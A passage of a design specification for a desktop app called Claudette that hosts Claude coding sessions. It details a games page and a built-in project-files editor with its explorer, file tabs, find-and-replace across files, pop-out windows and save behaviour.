- **Minesweeper.** Claudette hides her mines in a field of nine by nine, which fits the right side at its narrowest. She hides them as the user opens the first square, never in it or next to it, so it always opens onto some room; a square with no mines around it opens those around it, and so on. A click opens a square, a right-click or **F** flags it (again, unflags it), and a click on a number with as many flags around it as mines opens the rest around it, so a flag in the wrong place opens a mine. Opening every square without a mine wins; opening a mine loses, and shows her other mines, and a cross on each flag where there was none. Over the field: *Claudette hid 13 mines. Open a square.*, then how many are left to flag (the mines less the flags). The numbers are in the classic colors (1 blue, 2 green, 3 red, and so on); her mines are berry, the user's flags blue. **Level**: Easy, Normal or Hard (10, 13 or 16 mines); changing it starts a new field. Minesweeper has no draws, and she has no turn: she doesn't think before anything.
- **Her turn.** She thinks for about a second before each move, with a "?" over her head on the composer. She reacts as she does to the tab: confetti when she wins, dizzy when she loses, a hop at a draw, and she wipes her brow when she blocks a move that would have won, when the user is down to their last miss, or when one square is left to open in Minesweeper. The user's moves keep her awake. While motion is reduced, or she's hidden, she still plays; she just doesn't react on the composer.
- **The score.** Each game keeps its own (*You 3 · Claudette 2 · Draws 1*), and its level, on this machine and across restarts; **Reset score** sets it back to nothing. A round dropped part-way isn't counted.
- **When Claude needs you.** A game never moves or hides anything. While a tab waits on the user, a line over the board says so: *"Claude needs you in auth refactor"* (or *"in 2 tabs"*), with **Go there**, which goes to the next one; or *"Claude is waiting for you in this tab"*. Her waving, the badge and notifications go on as ever.
- **Keyboard and screen readers.** Each square, column and letter is a button with a name (*"Top left, empty"*, *"Column 3, 2 of 6 filled"*, *"Letter E"*, *"Row 2, column 5, 1 mine around"*). While the page has focus, the number keys play tic-tac-toe's squares (1 to 9, from the top left) and Connect Four's columns (1 to 7), and the letters guess in hangman; in Minesweeper the arrow keys move between the squares, Space or Enter opens one and F flags it. None of it reaches the composer. Her moves and every result are read out (*"Claudette took the middle."*, *"You win!"*).

How it's built: `Games/` holds the rules and Claudette's play, with no UI and the random choices passed in: `TicTacToe` and `TicTacToeOpponent` (minimax), `ConnectFour` and `ConnectFourOpponent` (a depth-limited alpha-beta search), `Hangman` and `HangmanWords`, and `Minesweeper`, which hides her mines with the random passed in. `Services/GameService` holds the one game that's open, keeps each game's score and level in `state.json` (`AppState.Games`), and tells Claudette what happened through `MascotService`; the shell tells it which tabs wait. Each game has a view model on `GameViewModel` (`TicTacToeViewModel`, `ConnectFourViewModel`, `HangmanViewModel`, `MinesweeperViewModel`), which waits for her move on the injected clock. `Views/GamesView` is the page, made only while it shows: the tab's `ShownGames` is null otherwise, so a tab with no game open holds nothing for it. It takes the keyboard and Minesweeper's right-click; the squares move the focus between them with `XYFocus`. The game's menu is the Games window's own content in `Views/ToolPanelView`'s header, as Find's searches are. `GamesTests` (the rules and her play: Unbeatable never loses any game it can be played into), `GameServiceTests` and `GamesUiTests`.

### Project files

✅ Built 2026-10-15, designed the same day. **Steps**, at the end, gives the order it was built in. One command isn't in Settings → Keyboard yet: **Open project files**, under **Keyboard** below.

A code editor for the project's files, in a tab of the project's own: a tree of its folders and files, the files open in tabs, and Claude's changes marked where they are in the code. Until now Claudette left editing to the user's own editor ([§1](#non-goals-v1)), so reading what Claude wrote, or fixing a line of it, meant leaving the conversation. It's an editor, not an IDE: no language services, building or debugging. In a Perforce workspace it opens files in Perforce as they change, and its menus have Perforce's commands ([Perforce in the Files tab](#perforce-in-the-files-tab)).

```
┌────────────────────┬──────────────────────┬──────────────────────────────────────────────────┐
│ ▾ ● NightOwl  ▤ +  │ Explorer     ⌕ ⊟ ⋯   │ PlayerController.cpp ● │ Config.h │ ⋯            │
│ │ ▤ Project Files  │ ▾ Source             ├──────────────────────────────────────────────────┤
│ │   PlayerContro…  │   ▾ Game             │ Edit · Inline changes · Side by side  ✓ Reviewed │
│ │ ● refactor au…   │     ▾ Player       • │  40    float Health = 100.f;                     │
│ │   Opus · High    │       PlayerCon…   M │  41  ▌ float Speed = 600.f;                      │
│ │ ! fix login b…   │       Config.h       │  42  ▌ void Tick(float Dt) override;             │
│ │   Needs input    │ ▸ Config             │  43    };                                        │
│                    │   README.md        A │                                                  │
│                    │                      │                   ╭────────────────────────────╮ │
│                    │                      │                   │ Ln 42, Col 7 · C++ · CRLF  │ │
│                    │                      │                   │ UTF-8 · 4 spaces           │ │
│                    │                      │                   ╰────────────────────────────╯ │
└────────────────────┴──────────────────────┴──────────────────────────────────────────────────┘
```

- **The Project Files tab.**
  - A project's group has at most one. The **Project files** button (a file icon, its tip *"Project files"*) beside the group's `+` opens it, or selects it when it's open, with its explorer showing even where it was hidden (**The layout**, below). So do:
    - **Open project files** in the group's menu, in the full sidebar and the rail;
    - the command palette's **Open project files** and **Go to file…** ([§4](#command-palette));
    - opening a file from elsewhere (**Opening files in the editor**, below).
  - **Its row** is the group's first, above pinned tabs.
    - It has a file icon where a tab has its status icon, the name **Project Files**, and on its second line the file showing (`PlayerController.cpp`), or *No files open*.
    - While files have unsaved edits, the second line says *2 unsaved* in the caution color, and the icon has a dot.
    - It has a close button as a tab's row does. The rail shows it as a square with the file icon.
    - Its menu: **Open beside**, **Close pane** (while it's in one), **Reveal in file manager**, **Copy path** and **Close**.
  - It stays first: it can't be dragged within the group, and **Move up** and **Move down** pass it by. Its row can be dragged onto a pane ([Split panes](#split-panes)).
  - `Ctrl+Tab`, `Ctrl/Cmd+1…9` and `Ctrl/Cmd+J` go only through session tabs and skip it, so opening it never changes the session tabs' numbers. It's reached with a click, its button, or `Ctrl/Cmd+P` (**Finding a file by name**, below).
  - **It keeps its group in the sidebar.** Closing the group's last session tab leaves the group with only its Files tab, and **Close group** closes it too.
  - It comes back on launch with the files it had open, as a pinned tab does. It has no `claude` to start.
  - **It has nothing a session has:**
    - no composer; the tool windows show its group's session tab focused last, named over them ([Tool windows](#tool-windows));
    - no status, usage or notifications;
    - and Claudette on the composer stays on the session panes.
- **Panes.** It takes part in split panes as a session tab does ([Split panes](#split-panes)), so the conversation can be on one side and the code on the other.
  - That covers **Open beside**, dragging its row onto a pane, resizing, and the restart snapshot.
  - Its pane keeps the least width every pane does, 360 pixels. Inside it, the explorer gives way first (**The layout**, below).
- **The layout.** The explorer and the editor sit side by side.
  - The explorer is on the left by default, or on the right with Settings → Files and diffs → **The explorer is on the** (**Left** or **Right**). The explorer's **⋯** menu has **Move to the right** (or **left**), which changes the same setting.
  - **Width.** Drag the explorer's edge to make it wider or narrower: at least 180 pixels, 260 by default; a double-click on the edge goes back to that. The width is the same for every Files tab, and remembered.
  - A button at the start of the file tabs' row hides and shows the explorer, and that's remembered too. A Files tab a conversation opened beside it for its first file starts with its explorer hidden (**Opening files in the editor**, below). Opening the Files tab from its group (the **Project files** button, **Open project files**) shows the explorer again, in every Files tab.
  - In a narrow pane, the explorer narrows first, to leave the editor 360 pixels, down to its own least; only then does the editor narrow.
- **The explorer.**
  - **Its header** has the group's label, **New file** (a page with a plus), **Find file** (a magnifier, `Ctrl/Cmd+P`), **Collapse all** and **⋯**. The **⋯** menu has:
    - **New folder** (**New files and folders**, below);
    - **Find in files…** and **Replace in files…**, in the whole project (**Finding in files**, below);
    - **Show only changed files**;
    - **Claude's changes** or **Against git HEAD**, in a repository (**Claude's changes**, below);
    - **Move to the right**;
    - **Refresh**.
  - **The tree** lists folders first, then files, by name, ignoring case. A folder's entries are read when it's expanded.
    - `.git` isn't shown.
    - What git ignores is shown dimmed. Git is asked as a folder is read, with `--no-optional-locks`. Outside a repository, the folders the composer's `@` list skips (`node_modules`, `bin`, `obj` and the like) are dimmed instead.
    - With Settings → Git → **Files git ignores** at **Hidden** (**Dimmed** by default), they're left out of the tree instead, in a repository and out of one. Changing it reads every folder shown again in each open Files tab, keeping what's expanded and selected, so they go, or come back dimmed, at once.
    - A link to a folder shows with a link badge and expands like a folder, unless it leads back up into the tree.
  - **It follows the disk.** The folders shown are watched. Half a second after files appear, go or are renamed, they're redrawn, keeping what's expanded and selected.
  - **Claude's changes in the tree.**
    - A file Claude changed has a letter at its right in the change colors: **M**, or **A** for a file Claude created.
    - A folder holding one has a dot.
    - A reviewed file's letter is faint.
    - **Show only changed files** shows just those, and the files Claude deleted, struck through. Opening a deleted file shows its diff.
  - **Opening.** A click opens a file in the preview tab; a double-click or Enter opens it to stay (**File tabs**, below). The arrow keys move without opening anything, and Right and Left expand and collapse.
  - **A file's menu:** **Open**, **Open in the OS's app**, **Open diff** (when Claude changed it), **New file**, **New folder**, **Copy path**, **Copy relative path**, **Reveal in file manager**, **Rename** and **Delete**, and in a Perforce workspace its Perforce section ([Perforce in the Files tab](#perforce-in-the-files-tab)).
    - On a program or shortcut that isn't text (`.exe`, `.lnk`, `.app`, `.desktop`), **Open in the OS's app** shows it in its folder rather than running it, as a reply's link does ([Files named in Claude's replies](#files-named-in-claudes-replies)).
  - **A folder's menu:** **New file**, **New folder**, **Copy path**, **Copy relative path**, **Reveal in file manager**, **Collapse**, **Rename** and **Delete**, and in a Perforce workspace its Perforce section, for everything under it.
  - **The empty space under the tree** has a menu of its own: **New file** and **New folder**, then **Find in files…** and **Replace in files…**.
  - **New files and folders.**
    - **Where they go.** From a folder's menu, in that folder; from a file's, beside it, in its folder; from the empty space under the tree, at the top of the project. The header's **New file** and **⋯** → **New folder** go by the selected row: in a selected folder, beside a selected file, at the top with nothing selected.
    - **Naming it.** The folder expands, and a row takes the top of its entries, indented as they are, with a file's or a folder's icon and a box with the keyboard in it (*File name*, *Folder name*). `Enter` makes it; `Esc`, or a click elsewhere, leaves without making anything, as does `Enter` with the box empty.
      - Slashes make the folders on the way: `AI/Brain.cpp` makes `AI` and the file in it. Spaces around the name are dropped.
      - While the box is open, the tree waits to show what changed on disk, so the row isn't taken from under the typing; it catches up once the box goes.
      - If **Show only changed files** or the found files' list has the tree's place, the tree comes back first.
    - **What's refused** is said under the box, in the error color, as it's typed; `Enter` keeps the box until the name can be used:
      - a name already there (*"There's already a file called Brain.cpp here."*), or a file where a folder on the way would go;
      - `.` and `..`, so the name can't lead out of the folder;
      - a control character, and on Windows, `< > : " | ? *`, a name ending in a space or a dot, and the names Windows keeps for devices (`CON`, `NUL`, `COM1` and the like, with or without an extension);
      - anything the system refuses when it's made, with its reason.
    - **Then:** a new file is empty and opens to stay, with the keyboard in the editor; a new folder is selected, with the keyboard in the tree. Either way it's selected in the tree, with the folders down to it expanded. Nothing is written over: a file that appears with the name meanwhile stays as it is, and the box says so.
  - **Renaming and deleting.** ✅ Built 2026-10-26.
    - **Rename**, on a file's or folder's menu, or `F2` in the tree, puts a box in the row's place with its name in it: a file's selected up to its extension (all of a name like `.gitignore`), so typing keeps the extension. `Enter` renames it; `Esc`, a click elsewhere, or `Enter` with the name as it was, leaves it.
      - The name is checked as it's typed, as a new one is (**What's refused**, above), and can't have a slash: renaming keeps it in its folder. A change of case alone renames it, on a disk that ignores case too (it goes by way of a name of its own). Nothing is written over.
      - The files open from it follow it, in every Files tab, unsaved edits and all, whose copy on disk takes the new name; a new extension colors the file anew. A folder that was expanded stays so, with the folders in it that were. It's selected, with the keyboard in the tree.
      - It's a rename on disk, as a file manager's is, not `git mv`: git sees the rename by itself. In a Perforce workspace, Settings → Perforce → **Rename with p4 move** (on by default) moves it in Perforce too, after the rename on disk ([Opening files in Perforce](#opening-files-in-perforce)).
    - **Delete**, on the same menus, or `Delete` in the tree (`Cmd+Backspace` on macOS, as Finder's), asks first, in place under the explorer's header, in the caution colors, with the keyboard on **Delete**; `Esc` is **Cancel**. The question names it: *"Delete Brain.cpp? It goes to the Recycle Bin."*, or for a folder, how many files it holds, through its folders but not into links (*"Delete the folder AI and the 12 files in it?"*, *"the empty folder"*, counting no further than 10,000), or for a link, that what it leads to stays. When files open from it have unsaved edits, in any Files tab, it says those go too.
      - It goes to the OS's trash, where it can be put back from: Windows' Recycle Bin, the macOS Trash, or on Linux the desktop's trash, through `gio trash` (GLib's tools). Where it can't (a network share, a drive with no Recycle Bin, one too large for it, Linux without `gio`), nothing is deleted, and the question changes to say so and why, with **Delete permanently** and *"It can't be put back."* Nothing is deleted for good without that.
      - When it can't be moved (open elsewhere, not Claudette's to move), the question stays, saying why under it in the error color.
      - Once it's gone, its open files close in every Files tab, their unsaved edits and the copies of them too, and the row after it is selected (or before it, at the end of its folder).
- **Finding a file by name.**
  - **Find file** in the explorer's header, or `Ctrl/Cmd+P` anywhere (rebindable, [§14](#keyboard-shortcuts)), puts a box at the top of the explorer and gives it the focus. From a conversation, `Ctrl/Cmd+P` first opens the project's Files tab, beside the conversation or in its place, as **Show a file clicked in a conversation** says (**Opening files in the editor**, below).
  - **What's searched.** Typing swaps the tree for a list of the files whose names match, best first.
    - It covers what the composer's `@` lists ([§5](#autocomplete)): the files git tracks and the new ones it doesn't ignore. Outside a repository, it's a walk of the folder that skips `node_modules`, `bin`, `obj` and the like.
    - Ignored files are left to the tree.
    - Only names are searched here; what's in the files is **Finding in files**, below.
  - **Matching** is the `@` list's: the letters in order, in the name first, then in the path. A match at the start of the name or of a word, or with the letters together, comes first, then shorter paths.
  - **Each result** is one line: the name, with its matched letters bold, then, muted, its folder relative to the project's (`PlayerController.cpp  Source/Game/Player`). So files with the same name can be told apart at a glance.
    - A path too long for the width is cut short from its start (`…/Game/Player`), and its tip shows the whole path.
    - A file at the top of the project shows no folder.
  - **Choosing.**
    - `Up` and `Down` choose, and `Enter` or a click opens the choice to stay.
    - A line number after the name goes to that line: `player:42`.
    - `Esc`, or emptying the box, brings the tree back, with the file just opened selected in it.
  - **How many.** The list holds the best 200, and says so: *"200 of 1,204 files. Type more to narrow them."*
    - While the list is first being made, it says *Listing files…*.
    - A project with more files than the `@` list's 100,000 says its list is cut short.
  - **Or in the files' text.** Under the count, a link, *Find "health" in files*, looks for what's typed (without a line number after it) with **Finding in files** instead, and brings the tree back. Its tip names the shortcut, which does the same with the keyboard in the box. Someone looking for text in the box for names finds the feature that looks there.
- **Finding in files.** ✅ Built 2026-10-28. Text in the project's files, found and replaced, as JetBrains Rider's **Find in Files** and **Replace in Path** do.
  - **Opening it.** **Find in files** (`Ctrl/Cmd+Shift+F`) and **Replace in files** (`Ctrl/Cmd+Shift+R`), both rebindable ([§14](#keyboard-shortcuts)), from anywhere in the main window; the command palette's **Find in files…** and **Replace in files…**; and a folder's menu in the explorer, **Find in folder…** and **Replace in folder…**, which look in that folder. It's for the focused tab's project, a session tab's or a Files tab's. Text selected in the editor, on one line, is what it looks for; otherwise it has what it had last, kept with the app's state.
  - **Where it's offered.** A feature reached only by its shortcut is one few find, so the Files tab offers it where looking for text starts:
    - with no file open, the tab lists what to do next, each with its shortcut as it's bound now, as Rider's empty editor does: **Go to file**, **Find in files**, **Replace in files** and **Command palette**;
    - **Finding a file by name** offers what's typed to it (*Find "health" in files*, above), and its shortcut, pressed in that box, looks for what's typed there;
    - the editor's find box (`Ctrl/Cmd+F`) has **Find in files** before its × (a page with the magnifier over its corner; its tip names the shortcut), which takes what the box has, with its **Aa**, **W** and **.\*** and, while it's replacing, its replacement, to the popup, finding or replacing as the box is; and the shortcut, pressed in the box, takes the same, so a search that found nothing in one file goes on through the project;
    - the explorer's **⋯** and the menu of the space under its tree have **Find in files…** and **Replace in files…** (**The explorer**, above);
    - and Claudette has a tip for it, *"Ctrl+Shift+F finds text in every file of the project"* ([§5](#claudette-on-the-composer)).
  - **The popup**, over the window, as the command palette is, and large (900 by 640), as Rider's is. From the top: its title and the project's name; the box, with **Aa** (match case), **W** (words) and **.\*** (regex) beside it, and a chevron at its left, as the editor's find box has; in **Replace in files**, the replacement under it, with **Replace** (the selected match) and **Replace all**; the **File mask** (`*.cs, *.h`, with `!*.Designer.cs` to leave some out) and where to look, **In project** or **Directory** with a folder (**⋯** picks one); then the matches, with the selected one's file under them; and at its foot the counts, the keys (*Enter opens · ↑↓ choose · Ctrl+Shift+R shows Replace · Esc closes*, as they're bound now and as the OS writes them) and **Open in Find window**. The keyboard starts in the box. The chevron, `Ctrl/Cmd+Shift+R` and `Ctrl/Cmd+Shift+F` switch it between finding and replacing, keeping what it looks for and what it found: the chevron points right while finding and down while replacing, and its tip says what a click does, *Show Replace (Ctrl+Shift+R)* or *Hide Replace (Ctrl+Shift+F)*. `Esc`, or a click outside it, closes it.
  - **The matches** come in as it's typed, 200 ms after typing stops, each a line: the line's text, its leading spaces dropped and cut short around the match, with the match in bold; and at its right the file's name and the line (`Player.cpp 42`), its path and column in its tip. They're in order, by path and then line. Under them: *57 matches in 12 files*, *(first 1,000 shown)* past a thousand, *No matches*, and *Searching…* while it is. A regular expression that isn't valid says why, in the error color, and nothing is looked for.
  - **The preview** under the matches is the selected match's file, colored as the Files tab colors it, read-only, scrolled to the match with it selected. Its path is over it.
  - **Choosing.** `Up` and `Down` choose; `Enter`, or a double-click, opens the match in the project's Files tab, with the match selected, as a file clicked in a conversation opens ([Opening files in the editor](#project-files)), and the popup closes. `Ctrl/Cmd+Enter` is **Open in Find window**.
  - **What's searched.** The files the composer's `@` lists, under the folder for **Directory**, that the mask lets through, and that are text by the editor's rules: not binary, not over 10 MB. A file open in a Files tab is searched as it is in its editor, unsaved edits and all. Matching is line by line, so a regular expression doesn't span lines, and one that takes over a second on a file skips it, saying so. **Words** matches whole words, by identifiers' letters. It runs off the UI thread, across files at once, eight at most, handing the matches on in batches; a search a later one overtakes is cancelled and its matches dropped.
  - **Replacing.** **Replace** replaces the selected match, if it's still there; **Replace all** asks first, in place, *Replace 57 matches in 12 files?* A regular expression's replacement can use its groups (`$1`). Each file is searched again just before, so a file changed since the search is replaced where its matches are now.
    - A file open in a Files tab changes in its editor, as one step its Undo takes back, and is left unsaved.
    - The rest change on disk, keeping their encoding, byte order mark and line endings. What's done first is what the project's files need (`IBeforeFilesWrite`, from the shell's `IFindInFilesHost.BeforeWriting`): in a Perforce workspace, checking them out (`PerforceBeforeFilesWrite`), in the changelist of the project's tab focused last; one Perforce couldn't check out, still read-only, is left as it is, with why ([Perforce in the Files tab](#perforce-in-the-files-tab)).
    - What it did is said under the options, *Replaced 57 matches in 12 files.*, with each file it couldn't change and why. Then it searches again.
  - **The Find window.** **Open in Find window** keeps the matches in the Find tool window, at the bottom, which shows: a tab in its header for each search, titled by what it looked for, which its × closes, stopping the search ([Tool windows](#tool-windows)). The window's icon is on the strip while it has a search. There they're grouped by file, each with its count, folding away with a click; the query and its options are over them, with **Search again**, and in replace mode the replacement and **Replace all**, which leaves out the matches unticked. A click on a match opens it as `Enter` does.
  - **How it's built.** Core's `ProjectFiles/FindInFiles` (the search), `FindMatcher` (the query and the file mask) and `FindReplace` (the edits, and writing on disk); the App's `FindInFilesViewModel` (the popup), `FindResultsViewModel` (the Find window's, a tool window of the kind `ToolWindowKinds.FindResults`, which `ToolWindowView` shows with `Views/FindResultsView` and disposes when it closes), `FindInFilesSearch` (what both share), `ShellViewModel.FindInFiles.cs` and `Services/PerforceBeforeFilesWrite`, with `Views/FindInFilesView`. What it starts with, when not what it had last, is a `FindStart`: from the focused Files tab (`ProjectFilesViewModel.FindInFilesStart`, which asks its view whether the keyboard's in Go to file's box, and the file showing's editor, `ProjectFileViewModel.FindInFilesStart`, for its find box or selection), or from what was clicked. The find box's button is added to AvaloniaEdit's own find box by `Views/Editor/SearchPanelButtons`, which already gives its buttons commands that work wherever the keyboard is; a log's find box doesn't have it. Tests: `FindInFilesTests` in Core and the App, `PerforceFilesTabTests` (replacing in a workspace), `FindInFilesUiTests`, and `ProjectFilesUiTests` for the find box and the tab with nothing open.
- **File tabs.** A row of tabs over the editor, one per open file.
  - **A tab shows:**
    - the file's name, with its parent folder too when two open files share a name (`Player/Config.h`, `Enemy/Config.h`);
    - a dot while it has unsaved edits, which becomes the × on hover;
    - a pin while it's pinned, and a small check while it's reviewed.
  - Its tip gives the path from the project's folder, and who changed the file (*"Changed by Claude in refactor auth"*).
  - **Preview.** A click in the explorer opens a file in the preview tab, with its name in italics, and the next file opened that way replaces it. Typing in it, double-clicking its tab, or opening the file to stay keeps it.
  - **Pinned** tabs sit first, and **Close others**, **Close to the right**, **Close saved** and **Close all** leave them open.
  - **Using the row.** A click selects a tab, a middle click closes it, and dragging moves it along the row. When the tabs don't fit, the row scrolls sideways (the mouse wheel works) and keeps the selected one in view, and a **⋯** at its end lists every open file.
  - **A tab's menu:** **Close**, **Close others**, **Close to the right**, **Close saved**, **Close all**, **Pin** (or **Unpin**), **Open in a window** (or **Put back**, **A file in a window of its own** below), **Copy path**, **Copy relative path**, **Reveal in the explorer** (selects it in the tree), **Reveal in file manager**, **Open in the OS's app** and, while Claude changed the file, **Reviewed**.
  - `Ctrl+PageDown` and `Ctrl+PageUp` (`Cmd+Option+→` and `←` on macOS) go to the next and previous file. The window's **Close tab** shortcut closes the file showing (**Keyboard**, below).
  - **The last file closed beside another tab.** A Files tab beside another tab with its explorer hidden, as one a conversation opened for its first file is, has nothing left to show once its last file closes, however it's closed: it closes too, and the tab beside it has the width again. With its explorer showing, or on its own, it stays open, empty.
  - **With nothing open**, the editor's place says *No files open*, and under it what to do next, as Rider's empty editor has it: **Go to file**, **Find in files**, **Replace in files** and **Command palette**, each with its shortcut beside it as it's bound now (none for one that's been removed). While the open files are all in windows of their own (below), it says so instead: *Player.cpp is in a window of its own*, *3 files are in windows of their own*.
- **A file in a window of its own.** ✅ Built 2026-10-29. A file pops out of its Files tab into a window, as Rider's **Open in New Window** does, so the code can sit on another screen, or beside Claudette's window, while the conversation has all of it. It goes back as easily.
  - **Popping it out:**
    - **Open in a window** on its file tab's menu;
    - a button at the right of the file tabs' row, before **⋯**, a box with an arrow out of it, for the file showing (its tip *"Open Player.cpp in a window"*);
    - the command palette's **Open the file in a window**, while the Files tab is focused;
    - **dragging its tab out** of Claudette's window: dropped outside it, the file opens there, with the window's title bar under the pointer. While the pointer is outside, the tab is faded, to say what letting go does. Dropped back on the row, the drag moves the tab as before.
  - **The window.** As Claudette's other windows have ([§3](#window-frame)): its title bar has the file's name, a dot while it has unsaved edits, and its project's name, muted; the OS's taskbar and window lists have *Player.cpp — NightOwl*. Under it, a toolbar has the file's path from the project's folder at its left, and **Put back** at its right. Under that, the file as its tab shows it: the banners, the bar for Claude's changes and the preview, the editor with its gutter, peek and chip, and the diff modes, with the cursor, scroll and mode it had.
    - It opens over where the file was, a little down and to the right, the size of the editor's place in the tab, or centered on Claudette's window at 900 by 700 when the Files tab isn't on screen. It's at least 480 by 300.
    - It isn't held over Claudette's window: either can be in front, and each has its own button in the taskbar.
    - It follows Settings → Appearance → **Zoom**, as the main window does, below its title bar.
  - **Its keys** are the Files tab's: `Ctrl/Cmd+S` saves it and `Ctrl/Cmd+Alt+S` every file of its Files tab; **Find in the conversation** opens the editor's find; the previous and next message go through the changes; **Find in files** and **Replace in files** open the popup over Claudette's window, which comes to the front, with what the editor has selected; and **Close tab** puts it back.
  - **Its tab, meanwhile,** stays in the row, where it was, with a small window icon after its name (its tip *"In a window of its own"*). A click on it brings the window to the front, with the keyboard in it, and so does choosing it in **⋯**'s list. Its menu has **Put back** in place of **Open in a window**. `Ctrl+PageDown` and `Ctrl+PageUp` pass it by.
    - The tab's editor shows the next file that isn't in a window, or none. Popping out the last one from a Files tab beside another tab with its explorer hidden, as a conversation opens one, closes its pane, as **Close pane** does: the Files tab stays in the sidebar, holding the window.
    - The unsaved count on the Files tab's row counts it, renaming it in the explorer follows it, and Claude's changes, Perforce and a change on disk work as in the tab. The window looks at the file on disk again when it comes to the front, as Claudette's window does.
  - **Opening it again from elsewhere**, a file named in a reply, Changed files, **Go to file**, the explorer or Find in files, goes to its window, at the line, and brings it to the front; the Files tab isn't opened beside the conversation for it.
  - **Putting it back.** **Put back** in the toolbar, the window's ×, **Close tab** in it, or **Put back** on its tab's menu: the window closes, and the file shows in its tab again, where it is in the row, with its edits, cursor, scroll and mode. Nothing asks: its unsaved edits go back with it. The main window isn't brought forward or changed to the Files tab.
  - **Closing it.** Closing the file from its tab (its ×, **Close others** and the rest) closes the window too, asking first in the Files tab when it has unsaved edits. Deleted in the explorer, it closes with it. Closing the Files tab or its group closes its windows, asking once about the unsaved files as before.
  - **Not kept.** Quitting Claudette closes the windows. On launch, and after a restart into a new build ([§9](#working-on-claudette)), a file that was in one is back in its tab, as any open file is, with its unsaved edits; popping it out again is up to the user.
  - **Accessibility.** The row's button and the menus' items say what they do; the tab's icon is named *In a window of its own*; the window's **Put back** is a button with its name.
  - **How it's built.** `ProjectFileViewModel.IsInWindow`, and `WindowPlace` for where a dragged-out one opens; `ProjectFilesViewModel.Windows.cs` pops a file out, puts it back and brings its window forward, and keeps `Showing` to files that aren't in one. The shell's `ShowFileWindow`, which `ShellView` sets (`ShellView.FileWindows.cs`), opens or brings forward `Views/ProjectFileWindow`, which shows a `ProjectFileView` of the file. The tab's own view of a file is made only while the file isn't in a window (`ProjectFileViewModel.InTab`), since an editor takes its file's requests (`CodeEditor`, which gives back only what it set). Dragging out is the file tabs' drag in `ProjectFilesView`, past the window's edge. Tests: `ProjectFileWindowTests` and `ProjectFilesUiTests`.
- **The editor.**
  - **Its look.**
    - The code font and size from Settings → Appearance, scaled by the zoom ([§3](#accessibility)).
    - Its colors are the diff view's TextMate theme for the app's theme and style ([§8](#8-file-changes--diff-view)), so code looks the same in a reply's code block, in a diff and here.
    - The selection is a see-through tint of the app's own token, so the code keeps its colors under it. The current line's highlight uses the app's tokens too.
    - Addresses in the code aren't links. A click on one does what a click on any other text does.
  - **What it does:**
    - line numbers, with the current line drawn faintly;
    - find and replace (`Ctrl/Cmd+F`, and `Ctrl+H` or `Cmd+Option+F` on macOS), with match case, whole word and regular expressions;
    - **Go to line** (`Ctrl+G`);
    - folding by indentation, in any language;
    - box selection, dragging with `Alt` (`Option`) held.
  - **Wrap long lines** in Settings → Files and diffs (off by default) sets it for every file. `Alt+Z` (`Option+Z`) changes it for the file showing.
  - Tab and new lines indent as the file does (**The chip**, below). Undo goes back through the file's edits while it's open.
  - **Which files open.**
    - Text in UTF-8, or in UTF-16 or UTF-32 when its byte order mark says so, as Revert reads files ([Reverting](#reverting)).
    - A file that isn't valid text in one of those (Latin-1, say) opens read-only, saying why: saving a guess would change characters nobody touched.
    - Binary files (§8's test) and files over 10 MB don't open. The editor says so, with **Open in the OS's app**, and for a file named as an image, **Open in Claudette's image viewer** ([Opening images](#opening-images)).
    - A file Claudette isn't allowed to write opens read-only, saying so.
    - **Highlighting** colors what's on screen first and the rest of the file in the background, so even a long file opens colored where it's being read.
    - A line over 2,000 characters, such as a minified file's, stays in the default color, since coloring one that long slows every keystroke.
    - A file with a line over 1,000,000 characters opens read-only, saying why: typing on a line that long takes about half a second a key.
- **The chip.** A small rounded chip at the editor's bottom right, over the text, says where the cursor is and what the file is: *Ln 42, Col 7 · C++ · CRLF · UTF-8 · 4 spaces*. It fades while the cursor's line is under it, so it never hides what's being typed.
  - **The language** is the grammar the file's extension picks, as in the diff view. For a file without an extension, its first line's `#!` picks it (`bash`, `python`, `node`). Otherwise it's *Plain text*.
  - **Line endings:** *CRLF* or *LF*, whichever the file mostly has, or *Mixed* while it has both. New lines take the file's.
    - A click offers **LF** and **CRLF**, which changes every line's.
    - That's an edit like any other: Undo takes it back, and Save writes it.
  - **The encoding:** *UTF-8*, *UTF-8 with BOM*, *UTF-16 LE* and so on. Saving keeps it.
  - **Indentation:** *4 spaces* or *Tabs*, found from the file's indented lines. A file with none gets Settings → Files and diffs → **Indent new lines with** (4 spaces by default).
    - A click offers **Indent with 2 spaces**, **Indent with 4 spaces**, **Indent with 8 spaces**, and **Indent with tabs, 2 wide**, **Indent with tabs, 4 wide** and **Indent with tabs, 8 wide**.
    - The choice is for Tab and new lines in this file while it's open; the lines already there stay as they are.
  - The position, the language and the encoding are only shown; a click on them does nothing.
- **Saving.**
  - **The keys.** `Ctrl/Cmd+S` saves the file showing while the Files tab has the focus; anywhere else it stays the composer's **Stash** ([§5](#drafts-and-the-stash)). `Ctrl/Cmd+Alt+S` saves every open file. While the Files tab has the focus, the command palette has both.
  - **How it writes.** A save keeps the file's encoding, byte order mark and line endings. It writes to a temporary name and renames it over the file, as Revert does ([Reverting](#reverting)): a link is written through, and the file keeps its permissions.
  - **Only over what was opened.** It writes only if the file is still what was opened or last saved. Otherwise it asks, as described under **When a file changes on disk**.
  - **Unsaved edits are kept.** A file's unsaved text is copied to the data folder a second after typing stops.
    - So quitting Claudette, a crash, or a restart into a new build ([§9](#working-on-claudette)) asks nothing and loses nothing: the file comes back with its edits and its dot.
    - Saving, or **Don't save**, removes the copy.
  - **Closing a file** with unsaved edits asks first, in place: *"Save PlayerController.cpp?"*, with **Save**, **Don't save** and **Cancel**.
  - **Closing the Files tab or its group** with unsaved files asks once, naming them, with **Save all**, **Don't save** and **Cancel**.
- **When a file changes on disk** (Claude's edits, a `git checkout`, the user's other editor):
  - **Noticing it.** An open file is watched. It's also looked at again when a tab of the project changes it with a tool, when one finishes a turn, and when Claudette comes to the front.
  - **With no unsaved edits**, the file is read again where it was: the cursor, selection, scroll and folds stay on their lines as near as they can. Undo takes the change back as one step.
  - **With unsaved edits**, a banner over the editor, in the caution colors, says *"Claude changed PlayerController.cpp in refactor auth while you were editing it."* When it wasn't one of the project's tabs, it says *"PlayerController.cpp changed on disk while you were editing it."* It offers:
    - **Compare**, which shows the file on disk against the edits, side by side;
    - **Keep mine**, which keeps the edits; saving then writes over the file on disk without asking again;
    - **Use theirs**, which reads the file again; Undo can take that back.
  - **Deleted or renamed:** a banner says *"PlayerController.cpp is gone from disk. Save to write it back."* The text stays: **Keep editing** keeps it, and saving writes the file back.
- **Claude's changes.**
  - **Against what.** A file's "before" is what it held before Claude first changed it in any of the project's open tabs: of the "befores" their Changed files have for it ([§8](#8-file-changes--diff-view)), the earliest.
    - With one tab, the editor and that tab's Changed files show the same changes.
